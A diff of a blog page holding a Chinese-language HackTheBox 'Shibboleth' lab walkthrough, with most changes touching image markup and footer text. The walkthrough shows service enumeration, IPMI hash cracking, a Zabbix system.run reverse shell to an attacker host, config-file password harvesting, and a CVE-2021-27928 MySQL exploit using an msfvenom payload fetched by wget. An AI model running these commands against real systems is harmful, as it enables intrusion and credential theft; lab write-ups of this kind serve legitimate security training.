@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;410  10.10.11.124                                                                                                              端口扫描只有80: 123456789">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;410  10.10.11.124   端口扫描只有80: 12345678910111213$ nmap -sV -sC 10.10.11.124Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-18 12:57 CSTNmap scan">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shibboleth - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/11/18/Shibboleth-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;410  10.10.11.124                                                                                                              端口扫描只有80: 123456789">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;410  10.10.11.124   端口扫描只有80: 12345678910111213$ nmap -sV -sC 10.10.11.124Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-18 12:57 CSTNmap scan">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111803.jpg">
@@ -122,8 +122,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -145,7 +152,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -213,14 +220,7 @@
 </li>
 <li><h2 id="10-10-11-124"><a href="#10-10-11-124" class="headerlink" title="10.10.11.124"></a>10.10.11.124</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111801.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>只有80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV -sC 10.10.11.124</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 12:57 CST</span><br><span class="line">Nmap scan report for 10.10.11.124</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41</span><br><span class="line">|_http-title: Did not follow redirect to http://shibboleth.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Service Info: Host: shibboleth.htb</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds</span><br></pre></td></tr></table></figure>
 
@@ -229,26 +229,12 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>ip访问跳转域名，添加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.124 shibboleth.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111802.jpg" alt=""></p>
 <p>页面底部， Powered by enterprise monitoring solutions based on Zabbix &amp; Bare Metal BMC automation      </p>
 <h1 id="vhosts"><a href="#vhosts" class="headerlink" title="vhosts"></a>vhosts</h1><p>可以发现几个子域名，其中有zabbix：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://shibboleth.htb/ -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50  | grep 200</span><br><span class="line">Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]</span><br><span class="line">Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]</span><br><span class="line">Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]</span><br></pre></td></tr></table></figure>
 
-<h2 id="zabbix-shibboleth-htb"><a href="#zabbix-shibboleth-htb" class="headerlink" title="zabbix.shibboleth.htb"></a>zabbix.shibboleth.htb</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="zabbix-shibboleth-htb"><a href="#zabbix-shibboleth-htb" class="headerlink" title="zabbix.shibboleth.htb"></a>zabbix.shibboleth.htb</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111803.jpg" alt=""></p>
 <h1 id="UDP端口"><a href="#UDP端口" class="headerlink" title="UDP端口"></a>UDP端口</h1><p>udp扫描可以发现623端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU -sV -F -v 10.10.11.124</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">623/udp open  asf-rmcp</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port623-UDP:V=7.92%I=7%D=11/18%Time=6195DFD3%P=x86_64-apple-darwin20.4.</span><br><span class="line">SF:0%r(ipmi-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x00</span><br><span class="line">SF:8\0\x01\x97\x04\x03\0\0\0\0\t");</span><br></pre></td></tr></table></figure>
 
@@ -260,69 +246,20 @@
 <h2 id="IMPI"><a href="#IMPI" class="headerlink" title="IMPI"></a>IMPI</h2><p>就是根据资料，一步步dump hash，破解密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilovepumkinpie1  (10.10.11.124 Administrator)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111804.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111805.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111806.jpg" alt=""></p>
 <h1 id="zabbix"><a href="#zabbix" class="headerlink" title="zabbix"></a>zabbix</h1><p>得到的账号密码可以登录zabbix：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111807.jpg" alt=""></p>
 <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>zabbix管理hosts可以执行系统命令，Configuration —&gt; Hosts —&gt;Items -&gt; create item,使用system.run key：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.run[bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;4444 &lt;&amp;1&#39;,nowait]</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111808.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111809.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>用户密码就是zabbix管理员密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipmi-svc ilovepumkinpie1</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111810.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>zabbix配置文件得到数据库密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep -iR 'password' /etc/zabbix/ 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword</span><br><span class="line">/etc/zabbix/zabbix_server.conf.dpkg-dist:#	Database password.</span><br><span class="line">/etc/zabbix/zabbix_server.conf.dpkg-dist:#	Comment this line if no password is used.</span><br><span class="line">/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=</span><br><span class="line">/etc/zabbix/zabbix_server.conf:### Option: DBPassword</span><br><span class="line">/etc/zabbix/zabbix_server.conf:#	Database password.</span><br><span class="line">/etc/zabbix/zabbix_server.conf:#	Comment this line if no password is used.</span><br><span class="line">/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh</span><br></pre></td></tr></table></figure>
 
@@ -335,22 +272,8 @@
 </ul>
 <h1 id="CVE-2021-27928"><a href="#CVE-2021-27928" class="headerlink" title="CVE-2021-27928"></a>CVE-2021-27928</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f elf-so -o CVE-2021-27928.so</span><br><span class="line"></span><br><span class="line">wget http://10.10.14.7:7777/CVE-2021-27928.so</span><br><span class="line"></span><br><span class="line">mysql -u zabbix -p -D zabbix</span><br><span class="line">bloooarskybluh</span><br><span class="line"></span><br><span class="line">SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111811.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111812.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111811.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021111812.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>623/UDP/TCP - IPMI - HackTricks<br><a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/623-udp-ipmi</a></li>
 <li>A Penetration Tester’s Guide to IPMI and BMCs | Rapid7 Blog<br><a href="https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/" target="_blank" rel="noopener">https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/</a></li>
@@ -366,7 +289,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-04-06T06:30:41.894Z" itemprop="dateUpdated">2022-04-06 14:30:41</time>
+    Last updated: <time datetime="2022-04-06T06:30:41.894Z" itemprop="dateUpdated">2022-04-06 14:30:41</time>
 </span><br>
 
 
@@ -533,11 +456,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
